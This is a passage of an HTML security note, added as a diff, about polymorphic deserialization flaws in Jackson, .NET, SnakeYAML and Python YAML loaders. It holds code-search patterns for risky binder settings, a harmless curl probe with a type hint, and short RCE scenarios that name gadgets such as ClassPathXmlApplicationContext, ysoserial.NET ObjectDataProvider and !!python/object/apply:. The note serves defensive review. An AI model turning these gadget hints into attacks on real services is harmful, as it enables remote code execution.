+<div class="codehilite"><pre><span></span><code>rg<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;enableDefaultTyping|@JsonTypeInfo|TypeNameHandling|SerializationBinder|new Yaml\\(|yaml\\.load|autoType|XStream&quot;</span><span class="w"> </span>src
+</code></pre></div>
+
+<p>Review every match as a trust-boundary decision: which endpoint receives the data, which types are allowed, and whether untrusted input reaches the binder.</p>
+<h3 id="probe-declared-schema-boundaries">Probe declared schema boundaries</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;test&quot;,&quot;@class&quot;:&quot;example.DoesNotExist&quot;,&quot;$type&quot;:&quot;example.DoesNotExist&quot;}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.example.test/configs
+</code></pre></div>
+
+<p>Endpoints that do not declare type-hint fields should reject them before binding.</p>
+<h3 id="verify-safe-yaml-loading-in-a-local-fixture">Verify safe YAML loading in a local fixture</h3>
+<div class="codehilite"><pre><span></span><code>rg<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;SafeConstructor|SafeLoader|FullLoader|Constructor&quot;</span><span class="w"> </span>src<span class="w"> </span>config
+</code></pre></div>
+
+<p>YAML parsers deserve the same scrutiny as JSON binders because YAML tags can trigger object construction.</p>
+<h2 id="practical-examples">Practical examples</h2>
+<ul>
+<li>A Spring Boot service with <code>objectMapper.enableDefaultTyping()</code> on a public POST endpoint — payload sets a Spring <code>ClassPathXmlApplicationContext</code> URL, RCE.</li>
+<li>A .NET ASP.NET API using <code>TypeNameHandling.All</code> for "convenience" on an admin endpoint — ysoserial.NET <code>ObjectDataProvider</code> payload, RCE.</li>
+<li>A Java config-loader using SnakeYAML <code>new Yaml().load(stream)</code> on <code>application.yaml</code> whose location is influenced by an environment variable — startup RCE if the attacker can write to the config path.</li>
+<li>A Python ML server using <code>yaml.load()</code> (default loader) on uploaded experiment configs — pickle-equivalent RCE through <code>!!python/object/apply:</code>.</li>
+<li>A modern microservice with <code>@JsonTypeInfo(use = Id.CLASS)</code> on a single field and no <code>BasicPolymorphicTypeValidator</code> — narrow attack surface but still RCE if a gadget exists in the dep tree.</li>
+<li>A GraphQL endpoint with a <code>JSON</code> scalar that round-trips through Jackson with default typing — polymorphism injection through the schema's escape hatch.</li>
+</ul>
+<h2 id="related-notes">Related notes</h2>
+<ul>
+<li><a href="../web-security/deserialization.html">Insecure deserialization</a> — parent vulnerability class; polymorphic binders are the JSON/YAML/XML-shaped variant.</li>
+<li><a href="../web-security/gadget-chains.html">Gadget chains</a> — same chain shape, different kick-off mechanism.</li>
+<li><a href="mass-assignment.html">mass-assignment</a> — adjacent: framework instantiates attacker-controlled fields. Polymorphic deserialization is the type-confusion superset.</li>
+<li><a href="jwt-attacks.html">jwt-attacks</a> — adjacent: structured client-supplied data binds to typed claims; library quirks can produce parallel exposures.</li>
+<li><a href="broken-object-property-level-authorization.html">broken-object-property-level-authorization</a> — adjacent: when polymorphism lets attackers substitute a privileged subclass on a request DTO.</li>
+<li><a href="api-security-top-10.html">api-security-top-10</a> — sits under API8:2023 <em>Security Misconfiguration</em> in the modern OWASP API Top 10.</li>
+</ul>
+<h3 id="suggested-future-atomic-notes">Suggested future atomic notes</h3>
+<ul>
+<li><span class="broken-link" title="Unresolved: jackson-default-typing">jackson-default-typing</span></li>
+<li><span class="broken-link" title="Unresolved: snakeyaml-safeconstructor">snakeyaml-safeconstructor</span></li>
+<li><span class="broken-link" title="Unresolved: newtonsoft-typenamehandling">newtonsoft-typenamehandling</span></li>
+<li><span class="broken-link" title="Unresolved: xstream-allowlists">xstream-allowlists</span></li>
+<li><span class="broken-link" title="Unresolved: fastjson-autotype">fastjson-autotype</span></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><strong>Foundational:</strong> OWASP Deserialization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</li>
+<li><strong>Foundational:</strong> OWASP API8:2023 Security Misconfiguration — https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/</li>
+<li><strong>Testing / Lab:</strong> PortSwigger Exploiting insecure deserialization — https://portswigger.net/web-security/deserialization/exploiting</li>
+<li><strong>Research / Deep Dive:</strong> Moritz Bechler, "Java Unmarshaller Security" (<code>marshalsec</code>) — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf</li>
+<li><strong>Official Tool Docs:</strong> ysoserial.net — https://github.com/pwntester/ysoserial.net</li>
+</ul>
+</article>
+</main>
+</div>
+<script src="../../assets/search.js"></script>
+</body>
+</html>
